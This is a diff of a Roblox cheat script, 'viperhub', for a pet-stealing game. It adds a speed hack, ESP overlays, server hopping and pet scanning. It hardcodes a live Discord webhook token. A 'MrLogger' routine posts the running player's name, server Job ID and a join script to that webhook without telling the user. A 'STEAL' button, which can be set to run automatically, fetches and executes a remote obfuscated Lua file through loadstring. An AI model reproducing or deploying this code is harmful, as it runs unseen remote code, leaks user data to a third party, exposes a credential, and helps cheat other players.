@@ -26,14 +26,20 @@ local LocalPlayer = Players.LocalPlayer
 local espInvisEnabled = false
 local espAllEnabled = false
 
-local speedMultiplier = 2.5
-local toggled = false
+local speedValue = 90 
+local defaultSpeed = 32 
+local isEnabled = false
 
 local PlaceID = game.PlaceId
 local AllIDs = {}
 local foundAnything = ""
 local actualHour = os.date("!*t").hour
 local isRunning = false
+
+local espConnections = {}
+local plotEspEnabled = false
+local updating = false
+local hue = 0
 
 local petsToFind = {
 	    ["Tralalero Tralala"] = true,
@@ -47,13 +53,14 @@ local petsToFind = {
     	    ["Torrtuginni Dragonfrutini"] = true,
     	    ["Pot Hotspot"] = true,
     	    ["Las Tralaleritas"] = true,
-    	    ["Lucky Block"] = true
+    	    ["Lucky Block"] = true,
+	    ["Nuclearo Dinossauro"] = true
 }
 
 local HttpService = game:GetService("HttpService")
 
 local sendedHOOK = false
-local webhookUrl = "https://discord.com/api/webhooks/1392494033691218070/fGYnf7I9DXSBMtQFc3UjFat2oz5V2DaBkR4-J9sVC1z4agPcJl2Qy7KmVquPerUiY_Et" 
+local webhookUrl = "https://discord.com/api/webhooks/1398035160166957126/qFCDrGkcYejwlSb8y2cLbYAgT201eacojy16g91HTmNlN-maOTucaAkCZBWJXXDpsNiS" 
 
 local playedSoundOnce = false
 local petBeams = {}
@@ -67,6 +74,26 @@ sound.Parent = game:GetService("SoundService")
 
 local HttpService = game:GetService("HttpService")
 local autoBuyConfigFile = "AutoBuyConfig.json"
+
+local serverCacheFile = "CachedServerList.json"
+local serverIndexFile = "CachedServerIndex.json"
+
+local autoExecConfigFile = "AutoExecuteConfig.json"
+local autoExecStates = {}
+
+if isfile(autoExecConfigFile) then
+	local success, data = pcall(function()
+		return HttpService:JSONDecode(readfile(autoExecConfigFile))
+	end)
+	if success and typeof(data) == "table" then
+		autoExecStates = data
+	end
+end
+
+local function saveAutoExecStates()
+	writefile(autoExecConfigFile, HttpService:JSONEncode(autoExecStates))
+end
+
 
 local autoBuyItems = {
 	["Medusa's Head"] = false,
@@ -89,31 +116,186 @@ if isfile and isfile(autoBuyConfigFile) then
 		end
 	end
 end
+--logger
+local TweenService = game:GetService("TweenService")
+local Players = game:GetService("Players")
+
+pcall(function() Players.LocalPlayer.PlayerGui:FindFirstChild("PetLoggerUI"):Destroy() end)
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "PetLoggerUI"
+screenGui.ResetOnSpawn = false
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+screenGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
+
+local container = Instance.new("Frame")
+container.Size = UDim2.new(0, 340, 0, 100)
+container.Position = UDim2.new(0, 20, 1, 120)
+container.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
+container.AnchorPoint = Vector2.new(0, 1)
+container.BorderSizePixel = 0
+container.Visible = false
+container.ZIndex = 5
+container.Parent = screenGui
+
+local stroke = Instance.new("UIStroke", container)
+stroke.Thickness = 2
+stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+stroke.Color = Color3.fromRGB(130, 100, 180)
+stroke.Transparency = 0.2
+Instance.new("UICorner", container).CornerRadius = UDim.new(0, 12)
+
+local navbar = Instance.new("Frame")
+navbar.Size = UDim2.new(1, 0, 0, 30)
+navbar.Position = UDim2.new(0, 0, 0, 0)
+navbar.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+navbar.BorderSizePixel = 0
+navbar.ZIndex = 6
+navbar.Parent = container
+Instance.new("UICorner", navbar).CornerRadius = UDim.new(0, 12)
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 1, 0)
+title.Position = UDim2.new(0, 0, 0, 0)
+title.BackgroundTransparency = 1
+title.Text = "😈Pets Found"
+title.Font = Enum.Font.GothamBold
+title.TextSize = 18
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.ZIndex = 7
+title.Parent = navbar
+
+local message = Instance.new("TextLabel")
+message.Size = UDim2.new(1, -20, 0, 60)
+message.Position = UDim2.new(0, 10, 0, 35)
+message.BackgroundTransparency = 1
+message.Text = ""
+message.Font = Enum.Font.GothamMedium
+message.TextSize = 20
+message.TextColor3 = Color3.fromRGB(255, 255, 255)
+message.TextXAlignment = Enum.TextXAlignment.Left
+message.TextYAlignment = Enum.TextYAlignment.Top
+message.ZIndex = 6
+message.Parent = container
+
+function showPetNotification(petName)
+	message.Text = petName
+	container.Visible = true
+	container.Position = UDim2.new(0, 20, 1, 120)
+
+	local tweenIn = TweenService:Create(container, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+		Position = UDim2.new(0, 20, 1, -20)
+	})
+	tweenIn:Play()
+
+	wait(3)
+
+	local tweenOut = TweenService:Create(container, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
+		Position = UDim2.new(0, 20, 1, 120)
+	})
+	tweenOut:Play()
+	tweenOut.Completed:Wait()
+	container.Visible = false
+end
 
 
-local function sendWebhook(foundPets)
+
+local myPlot = nil
+local myPlotMin, myPlotMax = nil, nil
+
+local function findMyPlot()
+	local plots = Workspace:WaitForChild("Plots")
+	for _, plot in pairs(plots:GetChildren()) do
+		local sign = plot:FindFirstChild("PlotSign")
+		if sign then
+			local gui = sign:FindFirstChildOfClass("SurfaceGui")
+			if gui then
+				local frame = gui:FindFirstChild("Frame")
+				if frame then
+					local label = frame:FindFirstChildOfClass("TextLabel")
+					if label and label.Text then
+						local baseName = string.match(label.Text, "^(.-)'s Base$")
+						if baseName and string.lower(baseName) == string.lower(Players.LocalPlayer.Name) then
+							myPlot = plot
+							-- вычисляем AABB (границы)
+							local cf, size = plot:GetBoundingBox()
+							local halfSize = size / 2
+							myPlotMin = (cf.Position - halfSize)
+							myPlotMax = (cf.Position + halfSize)
+							break
+						end
+					end
+				end
+			end
+		end
+	end
+end
+
+
+findMyPlot()
+
+
+
+
+
+
+
+--hook
+local function sendWebhook(foundPets, distance)
 	if webhookUrl == "" or #foundPets == 0 then return end
-	local data = {
-	["content"] = "**🔔 Pets Found:**\n" ..
-		table.concat(foundPets, "\n") ..
-		"\n\n👤 Player: `" .. Players.LocalPlayer.Name .. "`" ..
-		"\n🌐 Server ID: `" .. game.JobId .. "`",
-	["username"] = "Pet Scanner"
-    }
-	local json = HttpService:JSONEncode(data)
-	sendH00K = true
+
+	local player = Players.LocalPlayer
+	local serverLink = "roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
+	local joinScript = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. game.PlaceId .. ", '" .. game.JobId .. "')"
+	local serverPlayerCount = #Players:GetPlayers()
+	local timestamp = os.date("%Y-%m-%d %H:%M:%S")
+	local versionOS = "v2.41 Yes Money EDITION"
+
+	local petLines = ""
+	for _, petText in ipairs(foundPets) do
+		petLines = petLines .. petText .. " \n"
+	end
+
+	local embed = {
+		title = "━━━━━━━━━━━━━━━@here━━━━━━━━━━━━━━━",
+		description =
+			"😎 **MrLogger found some pets!** `" .. versionOS .. "`\n\n" ..
+			"**📦 Pets:**\n" .. petLines .. "\n" ..
+			"**👤 Explorer:** `" .. player.Name .. "`\n" ..
+			"**👥 Players:** `" .. serverPlayerCount .. "`\n" ..
+			"**⏰ Time:** `" .. timestamp .. "`\n\n" ..
+			"**🚀 Server Link:**\n" .. serverLink .. "\n\n" ..
+			"**📄 Job ID:**\n`" .. game.JobId .. "`\n\n" ..
+			"**💻 Join Script:**\n```lua\n" .. joinScript .. "\n```\n" ..
+			"━━━━━━━━━━━━━━━✅━━━━━━━━━━━━━━━",
+		color = 14177041 
+	}
+
+	local payload = {
+		["username"] = "😈MrLogger",
+		["content"] = "@here", 
+		["embeds"] = {embed}
+	}
+
+	local json = HttpService:JSONEncode(payload)
+
 	local request = (syn and syn.request) or (http and http.request) or http_request or request
 	if request then
 		pcall(function()
 			request({
 				Url = webhookUrl,
 				Method = "POST",
-				Headers = {["Content-Type"] = "application/json"},
+				Headers = {
+					["Content-Type"] = "application/json"
+				},
 				Body = json
 			})
 		end)
 	end
 end
+
+
+
 
 local function loadHopStatus()
 	local success, result = pcall(function()
@@ -133,22 +315,42 @@ end
 
 local isRunning = loadHopStatus()
 
-RunService.RenderStepped:Connect(function(dt)
-	if not toggled then return end
-	if humanoid.MoveDirection.Magnitude > 0 then	
-		local moveDir = humanoid.MoveDirection.Unit
-		local delta = moveDir * humanoid.WalkSpeed * (speedMultiplier - 1) * dt
-		hrp.CFrame = hrp.CFrame + delta
+
+
+local function updateSpeed()
+	humanoid.WalkSpeed = isEnabled and speedValue or defaultSpeed
+end
+
+humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
+	updateSpeed()
+end)
+
+
+player.CharacterAdded:Connect(function(char)
+	character = char
+	humanoid = character:WaitForChild("Humanoid")
+	updateSpeed()
+	humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(updateSpeed)
+end)
+
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+	if gameProcessed then return end
+	if input.KeyCode == Enum.KeyCode.V then
+		isEnabled = not isEnabled
+		updateSpeed()
+		
+		if isEnabled then
+			warn("[SpeedHack] Включено")
+		else
+			warn("[SpeedHack] Выключено")
+		end
 	end
 end)
 
-UIS.InputBegan:Connect(function(input, gpe)
-	if gpe then return end
-	if input.KeyCode == Enum.KeyCode.V then
-		toggled = not toggled
-		print("⚙️ SpeedHack " .. (toggled and "on" or "off"))
-	end
-end)
+updateSpeed()
+
+
+
 
 local function loadPetSettings()
 	local success, result = pcall(function()
@@ -221,7 +423,7 @@ Instance.new("UICorner", navbar).CornerRadius = UDim.new(0, 12)
 local title = Instance.new("TextLabel", navbar)
 title.Size = UDim2.new(0, 200, 1, 0)
 title.Position = UDim2.new(0, 12, 0, 0)
-title.Text = "viperhub v2.15 Jmot Edition"
+title.Text = "viperhub v2.41 Yes Money Edition"
 title.TextColor3 = Color3.fromRGB(250, 250, 250)
 title.Font = Enum.Font.FredokaOne
 title.TextSize = 22
@@ -415,17 +617,25 @@ statusLabel.TextSize = 16
 statusLabel.BackgroundTransparency = 1
 statusLabel.TextWrapped = true
 
-local petResultLabel = Instance.new("TextLabel", pages["Main"])
-petResultLabel.Size = UDim2.new(1, -20, 0, 100)
-petResultLabel.Position = UDim2.new(0, 10, 0, 50)
-petResultLabel.BackgroundTransparency = 1
-petResultLabel.TextXAlignment = Enum.TextXAlignment.Left
-petResultLabel.TextWrapped = true
-petResultLabel.TextYAlignment = Enum.TextYAlignment.Top
-petResultLabel.Text = "🐾 Found pets: none"
-petResultLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-petResultLabel.Font = Enum.Font.Gotham
-petResultLabel.TextSize = 15
+local petResultFrame = Instance.new("ScrollingFrame", pages["Main"])
+petResultFrame.Name = "PetResultFrame"
+petResultFrame.Size = UDim2.new(1, -20, 0, 120)
+petResultFrame.Position = UDim2.new(0, 10, 0, 50)
+petResultFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+petResultFrame.ScrollBarThickness = 6
+petResultFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+petResultFrame.BackgroundTransparency = 0.15
+petResultFrame.BorderSizePixel = 0
+petResultFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
+petResultFrame.ScrollingDirection = Enum.ScrollingDirection.Y
+
+local layout = Instance.new("UIListLayout", petResultFrame)
+layout.SortOrder = Enum.SortOrder.LayoutOrder
+layout.Padding = UDim.new(0, 4)
+
+local corner = Instance.new("UICorner", petResultFrame)
+corner.CornerRadius = UDim.new(0, 8)
+
 
 local idLabel = Instance.new("TextLabel", pages["Settings"])
 idLabel.Size = UDim2.new(1, -20, 0.6, 0)
@@ -563,14 +773,18 @@ local function getMutationMap()
 				local overhead = attachment and attachment:FindFirstChild("AnimalOverhead")
 				local displayName = overhead and overhead:FindFirstChild("DisplayName")
 				local mutation = overhead and overhead:FindFirstChild("Mutation")
+				local generation = overhead and overhead:FindFirstChild("Generation")
 
 				if spawn and displayName and displayName:IsA("TextLabel") then
 					local name = displayName.Text
 					local mutationText = (mutation and mutation:IsA("TextLabel") and mutation.Visible and mutation.Text ~= "" and mutation.Text ~= "None") and mutation.Text or nil
+					local generationText = (generation and generation:IsA("TextLabel")) and generation.Text or "Unknown"
+
 					table.insert(mutationMap, {
 						name = name,
 						position = spawn.Position,
-						mutation = mutationText
+						mutation = mutationText,
+						generation = generationText
 					})
 				end
 			end
@@ -591,19 +805,33 @@ local function scanForPets()
 
 	for _, obj in pairs(Workspace:GetDescendants()) do
 		if petsToFind[obj.Name] and obj:IsA("Model") then
+      local root = obj:FindFirstChild("HumanoidRootPart") or obj.PrimaryPart
+			if root and myPlotMin and myPlotMax then
+				local pos = root.Position
+				if pos.X >= myPlotMin.X and pos.X <= myPlotMax.X
+				and pos.Y >= myPlotMin.Y and pos.Y <= myPlotMax.Y
+				and pos.Z >= myPlotMin.Z and pos.Z <= myPlotMax.Z then
+					continue -- 🧱 на нашей базе — пропускаем
+				end
+			end
+
 			local root = obj:FindFirstChild("HumanoidRootPart") or obj.PrimaryPart
 			if root and obj:IsDescendantOf(Workspace) and not alreadyTagged[obj] then
 				if (root.Position - hrp.Position).Magnitude < 5000 then
 
-
+					-- 📌 Получаем mutation и generation
 					local mutationType = nil
+					local generationText = "Unknown"
+
 					for _, data in ipairs(mutationData) do
 						if string.lower(data.name) == string.lower(obj.Name) and (data.position - root.Position).Magnitude < 5 then
 							mutationType = data.mutation
+							generationText = data.generation
 							break
 						end
 					end
 
+					-- 🏷️ BillboardGui
 					if not obj:FindFirstChild("PetTag") then
 						local tag = Instance.new("BillboardGui")
 						tag.Name = "PetTag"
@@ -619,12 +847,19 @@ local function scanForPets()
 						label.TextStrokeTransparency = 0.5
 						label.TextScaled = true
 						label.Font = Enum.Font.GothamBold
-						label.Text = obj.Name .. (mutationType and (" 🧬" .. mutationType) or "")
+
+						local labelText = ""
+						if mutationType then
+							labelText = "⭐️" .. mutationType .. "⭐️ "
+						end
+						labelText = labelText .. obj.Name .. " - " .. generationText .. "  ✅   "
+						label.Text = labelText
 						label.Parent = tag
 
 						pulseRGB(label)
 					end
 
+					-- 🔗 Beam
 					local petAtt = Instance.new("Attachment")
 					petAtt.Name = "PetBeamAttachment"
 					petAtt.Parent = root
@@ -650,19 +885,43 @@ local function scanForPets()
 					end)
 
 					table.insert(petBeams, beam)
-					foundCount[obj.Name .. (mutationType and " 🧬" .. mutationType or " ")] = (foundCount[obj.Name] or 0) + 1
+
+					-- 🧾 Подсчёт
+					local key = (mutationType and "⭐️" .. mutationType .. "⭐️ " or "") .. obj.Name .. " - " .. generationText .. " ✅ "
+					foundCount[key] = (foundCount[key] or 0) + 1
 					alreadyTagged[obj] = true
 				end
 			end
 		end
 	end
 
+	for _, child in ipairs(petResultFrame:GetChildren()) do
+		if child:IsA("TextLabel") then
+			child:Destroy()
+		end
+	end
+
 	if next(foundCount) then
 		local displayLines = {}
+
 		for name, count in pairs(foundCount) do
-			table.insert(displayLines, name .. " (x" .. count .. ")")
+			local fullText = name .. " (x" .. count .. ")"
+
+			-- Добавить в ScrollFrame
+			local label = Instance.new("TextLabel")
+			label.Size = UDim2.new(1, -10, 0, 22)
+			label.BackgroundTransparency = 1
+			label.TextColor3 = Color3.fromRGB(240, 240, 240)
+			label.Font = Enum.Font.Gotham
+			label.TextSize = 14
+			label.TextXAlignment = Enum.TextXAlignment.Left
+			label.Text = fullText
+			label.Parent = petResultFrame
+
+			table.insert(displayLines, fullText)
 		end
-		petResultLabel.Text = "✅ Found pets:\n" .. table.concat(displayLines, "\n")
+
+		showPetNotification(table.concat(displayLines, "\n"))
 
 		if not playedSoundOnce then
 			playedSoundOnce = true
@@ -676,9 +935,20 @@ local function scanForPets()
 
 		autoBuyEnabledItems()
 	else
-		petResultLabel.Text = "❌ Found pets: none"
+		-- Ничего не найдено
+		local label = Instance.new("TextLabel")
+		label.Size = UDim2.new(1, -10, 0, 22)
+		label.BackgroundTransparency = 1
+		label.TextColor3 = Color3.fromRGB(180, 180, 180)
+		label.Font = Enum.Font.Gotham
+		label.TextSize = 14
+		label.TextXAlignment = Enum.TextXAlignment.Left
+		label.Text = "❌ Found pets: none"
+		label.Parent = petResultFrame
 	end
 end
+
+
 
 
 spawn(function()
@@ -712,51 +982,115 @@ local function teleportToNextServer()
 	local baseURL = "https://games.roblox.com/v1/games/" .. PlaceID .. "/servers/Public?sortOrder=Asc&limit=100"
 	local cursor = ""
 	local attemptedServers = {}
+	local failAttempts = 0
+	local serverCount = 0
+	local totalServersInBatch = 100
+
+  local cachedServers = {}
+  local currentIndex = 1
+  
+  if isfile(serverCacheFile) then
+  	local success, data = pcall(function()
+  		return HttpService:JSONDecode(readfile(serverCacheFile))
+  	end)
+  	if success and typeof(data) == "table" then
+  		cachedServers = data
+  	end
+  end
+  
+  if isfile(serverIndexFile) then
+  	local success, data = pcall(function()
+  		return tonumber(readfile(serverIndexFile))
+  	end)
+  	if success and data then
+  		currentIndex = data
+  	end
+  end
+
+
 
 	while isRunning do
-		local url = baseURL .. (cursor ~= "" and "&cursor=" .. HttpService:UrlEncode(cursor) or "")
-		local success, response = pcall(function()
-			return HttpService:JSONDecode(game:HttpGet(url))
-		end)
+		
+		if currentIndex > #cachedServers then
+			local url = baseURL .. (cursor ~= "" and "&cursor=" .. HttpService:UrlEncode(cursor) or "")
+			local success, response = pcall(function()
+				return HttpService:JSONDecode(game:HttpGet(url))
+			end)
 
-		if success and response and response.data then
-			cursor = response.nextPageCursor or ""
+			if success and response and response.data then
+				cursor = response.nextPageCursor or ""
+				failAttempts = 0
+				cachedServers = response.data
+				currentIndex = 1
+				totalServersInBatch = #cachedServers
 
-			for _, server in ipairs(response.data) do
-				if not isRunning then return end
+        pcall(function()
+		        writefile(serverCacheFile, HttpService:JSONEncode(cachedServers))
+		        writefile(serverIndexFile, tostring(currentIndex))
+	      end)
 
-				local id = tostring(server.id)
-				local alreadyTried = table.find(AllIDs, id) or attemptedServers[id]
+				wait(1 + math.random()) 
+			else
+				failAttempts += 1
+				statusLabel.Text = "⚠️ Failed to fetch servers. Retrying... (x" .. failAttempts .. ")"
+				wait(3 + math.random()) 
+				continue
+			end
+		end
 
-				if server.playing < server.maxPlayers and not alreadyTried then
-					table.insert(AllIDs, id)
-					attemptedServers[id] = true
+		local server = cachedServers[currentIndex]
+		currentIndex += 1
+    
+    pcall(function()
+	      writefile(serverIndexFile, tostring(currentIndex))
+    end)
 
-					statusLabel.Text = "🌐 Teleporting to:\n" .. id
-					pcall(function()
-						writefile("NotSameServers.json", HttpService:JSONEncode(AllIDs))
-						TeleportService:TeleportToPlaceInstance(PlaceID, id, Players.LocalPlayer)
-					end)
+		if not server then continue end
+		if not isRunning then return end
 
-					wait(0.3) 
-				end
+		local id = tostring(server.id)
+		local alreadyTried = table.find(AllIDs, id) or attemptedServers[id]
+
+		if server.playing < server.maxPlayers and not alreadyTried then
+			if hasWantedPets() then
+				statusLabel.Text = "✅ Pets Found! AutoHop stopped"
+				isRunning = false
+				saveHopStatus(false)
+				return
 			end
 
-			if not cursor then
-			
-				statusLabel.Text = "♻️ All servers tried. Resetting history..."
-				pcall(function() delfile("NotSameServers.json") end)
-				AllIDs = { actualHour }
+			serverCount += 1
+			table.insert(AllIDs, id)
+			attemptedServers[id] = true
+
+			statusLabel.Text = "🌐 Switching servers: Server (" .. serverCount .. "/" .. totalServersInBatch .. ")"
+			pcall(function()
 				writefile("NotSameServers.json", HttpService:JSONEncode(AllIDs))
-				cursor = ""
-				wait(0.5)
-			end
-		else
-			statusLabel.Text = "⚠️ Failed to fetch servers. Retrying..."
-			wait(3)
+				TeleportService:TeleportToPlaceInstance(PlaceID, id, Players.LocalPlayer)
+			end)
+
+			wait(0.3)
+		end
+
+		if cursor == "" and currentIndex > #cachedServers then
+			statusLabel.Text = "♻️ All servers tried. Resetting history..."
+			pcall(function() delfile("NotSameServers.json") end)
+			AllIDs = { actualHour }
+			writefile("NotSameServers.json", HttpService:JSONEncode(AllIDs))
+			cursor = ""
+			cachedServers = {}
+			currentIndex = 1
+      pcall(function()
+	        delfile(serverCacheFile)
+	        delfile(serverIndexFile)
+      end)
+
+			wait(1)
 		end
 	end
 end
+
+
 
 autoHopButton.MouseButton1Click:Connect(function()
 	isRunning = true
@@ -947,19 +1281,106 @@ RunService.Stepped:Connect(function()
   end
 end)
 
-if loadHopStatus() then
-	spawn(function()
-		wait(2) 
-		if hasWantedPets() then
-			statusLabel.Text = "✅ Pets Found! AutoHop stopped"
-			isRunning = false
-			saveHopStatus(false)
-		else
-			statusLabel.Text = "🔁 AutoHop: hopping..."
-			teleportToNextServer()
+local function clearESP()
+	for _, data in pairs(espConnections) do
+		if data.gui then
+			data.gui:Destroy()
+		end
+	end
+	espConnections = {}
+	updating = false
+end
+
+-- Создание одного ESP над Plot
+local function createESP(plotModel, adorneePart, remainingTextObj)
+	local billboard = Instance.new("BillboardGui")
+	billboard.Name = "ESP_RemainingTime"
+	billboard.Adornee = adorneePart
+	billboard.Size = UDim2.new(0, 200, 0, 50)
+	billboard.StudsOffset = Vector3.new(0, 5, 0)
+	billboard.AlwaysOnTop = true
+
+	local label = Instance.new("TextLabel")
+	label.Size = UDim2.new(1, 0, 1, 0)
+	label.BackgroundTransparency = 1
+	label.Text = ""
+	label.TextColor3 = Color3.fromHSV(hue, 1, 1)
+	label.TextStrokeTransparency = 0
+	label.TextScaled = true
+	label.Font = Enum.Font.SourceSansBold
+	label.Parent = billboard
+
+	billboard.Parent = adorneePart
+
+
+	espConnections[plotModel] = {
+		gui = billboard,
+		label = label,
+		sourceText = remainingTextObj
+	}
+end
+
+
+function scanAndCreateESP()
+	clearESP()
+
+	local plots = Workspace:FindFirstChild("Plots")
+	if not plots then return end
+
+	for _, plot in ipairs(plots:GetChildren()) do
+		local purchases = plot:FindFirstChild("Purchases")
+		if purchases then
+			local block = purchases:FindFirstChild("PlotBlock")
+			if block and block:FindFirstChild("Main") then
+				local main = block.Main
+				local gui = main:FindFirstChild("BillboardGui")
+				if gui and gui:FindFirstChild("RemainingTime") then
+					local remainingText = gui.RemainingTime
+					if remainingText.Text and remainingText.Text ~= "" then
+						createESP(plot, main, remainingText)
+					end
+				end
+			end
+		end
+	end
+end
+
+function startUpdatingESP()
+	if updating then return end
+	updating = true
+
+
+	RunService.RenderStepped:Connect(function()
+		if not updating then return end
+		hue = (hue + 0.002) % 1
+		for _, data in pairs(espConnections) do
+			if data.label then
+				data.label.TextColor3 = Color3.fromHSV(hue, 1, 1)
+			end
+		end
+	end)
+
+
+	task.spawn(function()
+		while updating do
+			for _, data in pairs(espConnections) do
+				if data.label and data.sourceText then
+					local txt = data.sourceText.Text
+					if txt == "60s" or txt == "" then
+						data.label.Text = "Open"
+					else
+						data.label.Text = txt
+					end
+				end
+			end
+			task.wait(1)
 		end
 	end)
 end
+
+
+
+
 
 local utilToggleFrame = Instance.new("Frame", pages["AutoBuy"])
 utilToggleFrame.Size = UDim2.new(1, -20, 1, -20)
@@ -1025,7 +1446,7 @@ uiList:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
 	scroll.CanvasSize = UDim2.new(0, 0, 0, uiList.AbsoluteContentSize.Y + 10)
 end)
 
-local function createUtilButton(text, color, callback)
+local function createUtilButton(text, color, callback, id)
 	local btn = Instance.new("TextButton")
 	btn.Size = UDim2.new(1, -10, 0, 40)
 	btn.Text = text
@@ -1034,7 +1455,48 @@ local function createUtilButton(text, color, callback)
 	btn.Font = Enum.Font.GothamBold
 	btn.TextSize = 16
 	btn.BorderSizePixel = 0
+	btn.TextXAlignment = Enum.TextXAlignment.Left
 	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
+
+	local dropButton = Instance.new("TextButton", btn)
+	dropButton.Size = UDim2.new(0, 24, 0, 24)
+	dropButton.Position = UDim2.new(1, -28, 0.5, -12)
+	dropButton.Text = "⚙️"
+	dropButton.TextSize = 14
+	dropButton.Font = Enum.Font.Gotham
+	dropButton.TextColor3 = Color3.new(1,1,1)
+	dropButton.BackgroundColor3 = Color3.fromRGB(60, 60, 90)
+	Instance.new("UICorner", dropButton).CornerRadius = UDim.new(0, 6)
+
+	-- создаём отдельный слой для переключателя
+	local toggleContainer = Instance.new("Frame")
+	toggleContainer.Size = UDim2.new(1, -10, 0, 24)
+	toggleContainer.BackgroundTransparency = 1
+	toggleContainer.ZIndex = 10
+	toggleContainer.Visible = false
+	toggleContainer.Parent = scroll -- 👈 в scroll, не в btn
+
+	local toggle = Instance.new("TextButton", toggleContainer)
+	toggle.Size = UDim2.new(1, 0, 1, 0)
+	toggle.Text = (autoExecStates[id] and "✅ AutoExecute" or "❌ AutoExecute")
+	toggle.TextColor3 = autoExecStates[id] and Color3.fromRGB(150, 255, 150) or Color3.fromRGB(255, 100, 100)
+	toggle.Font = Enum.Font.Gotham
+	toggle.TextSize = 14
+	toggle.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
+	toggle.BorderSizePixel = 0
+	Instance.new("UICorner", toggle).CornerRadius = UDim.new(0, 6)
+
+	dropButton.MouseButton1Click:Connect(function()
+		toggleContainer.Visible = not toggleContainer.Visible
+		toggleContainer.Position = UDim2.new(0, btn.Position.X.Offset, 0, btn.Position.Y.Offset + btn.Size.Y.Offset)
+	end)
+
+	toggle.MouseButton1Click:Connect(function()
+		autoExecStates[id] = not autoExecStates[id]
+		toggle.Text = (autoExecStates[id] and "✅ AutoExecute" or "❌ AutoExecute")
+		toggle.TextColor3 = autoExecStates[id] and Color3.fromRGB(150, 255, 150) or Color3.fromRGB(255, 100, 100)
+		saveAutoExecStates()
+	end)
 
 	btn.MouseEnter:Connect(function()
 		btn.BackgroundColor3 = color:lerp(Color3.new(1, 1, 1), 0.2)
@@ -1045,11 +1507,58 @@ local function createUtilButton(text, color, callback)
 
 	btn.MouseButton1Click:Connect(callback)
 	btn.Parent = scroll
+	if autoExecStates[id] then
+		callback()
+	end
+
 end
 
-createUtilButton("⚡ Insta-stealer", Color3.fromRGB(120, 80, 200), function()
+
+createUtilButton("🥩 Rejoin Server", Color3.fromRGB(120, 80, 200), function()
 	pcall(function()
-		local code = game:HttpGet("https://raw.githubusercontent.com/0ksy1/viperhub/refs/heads/main/uti")
-		loadstring(code)()
+		local placeId = game.PlaceId
+		local jobId = game.JobId
+		local player = game:GetService("Players").LocalPlayer
+		local TeleportService = game:GetService("TeleportService")
+
+		TeleportService:TeleportToPlaceInstance(placeId, jobId, player)
 	end)
-end)
+end, "rejoin")
+
+createUtilButton("😈STEAL - ARBIXHUB", Color3.fromRGB(120, 80, 200), function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Youifpg/Steal-a-Brainrot-op/refs/heads/main/Arbixhub-obfuscated.lua"))()
+end, "instasteal")
+
+createUtilButton("🧍 ESP", Color3.fromRGB(120, 80, 200), function()
+	espAllEnabled = not espAllEnabled
+	espInvisEnabled = not espInvisEnabled
+	print("ESP All: " .. tostring(espAllEnabled))
+end, "ESP")
+
+createUtilButton("🧭 Timer ESP", Color3.fromRGB(120, 80, 200), function()
+	plotEspEnabled = not plotEspEnabled
+
+	if plotEspEnabled then
+		scanAndCreateESP()
+		startUpdatingESP()
+	else
+		clearESP()
+	end
+end, "Timer")
+
+
+
+
+if loadHopStatus() then
+	spawn(function()
+		wait(2) 
+		if hasWantedPets() then
+			statusLabel.Text = "✅ Pets Found! AutoHop stopped"
+			isRunning = false
+			saveHopStatus(false)
+		else
+			statusLabel.Text = "🔁 AutoHop: hopping..."
+			teleportToNextServer()
+		end
+	end)
+end
